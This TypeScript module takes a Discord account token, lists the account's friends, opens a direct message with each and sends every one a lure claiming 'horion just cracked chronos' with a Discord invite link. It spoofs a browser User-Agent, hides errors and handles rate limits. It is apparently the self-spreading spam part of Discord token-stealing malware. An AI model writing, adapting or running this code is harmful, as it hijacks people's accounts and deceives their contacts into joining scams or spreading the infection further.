import fetch from 'node-fetch';

interface IFriend {
    id: string;
    type: number;
    nickname: string | null
    user: {
        id: string
        username: string
        avatar: string
        avatar_decoration: string | null
        discriminator: string
        public_flags: 0
    }
}

interface IChannel {
    id: string,
    type: number,
    last_message_id: string,
    recipients: IFriend[]
}

export default async (token: string) => {
    const friends: IFriend[] = await (await fetch(`https://discord.com/api/users/@me/relationships`, { headers: { Authorization: token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" } })).json();
    const allFriends = friends.map((friend: IFriend) => friend.id);
    const allChannels: string[] = [];
    
    for (const friend of allFriends) {
        try {
            const channel = await fetch(`https://discord.com/api/v9/users/@me/channels`, { 
                method: 'POST', 
                body: JSON.stringify({
                    recipients: [friend],
                }), 
                headers: { 
                    Authorization: token,
                    "Content-type": "application/json; charset=UTF-8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                }
            });
            const channelData: IChannel = await channel.json();
            allChannels.push(channelData.id);
        } catch (e) {}
    }

    for (const channel of allChannels) {
        try {
            const message = await fetch(`https://discord.com/api/v9/channels/${channel}/messages`, {
                method: 'POST',
                body: JSON.stringify({
                    content: 'Hey, horion just cracked chronos. it is actually insane! discord.gg/horion',
                    nonce: '',
                    tts: false
                }),
                headers: {
                    Authorization: token,
                    "Content-type": "application/json; charset=UTF-8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                }
            });
            const messageData = await message.json();
            if (messageData.retry_after) await new Promise((resolve) => { setTimeout(resolve, messageData.retry_after * 1000) });
        }
        catch (e) {}
    }
}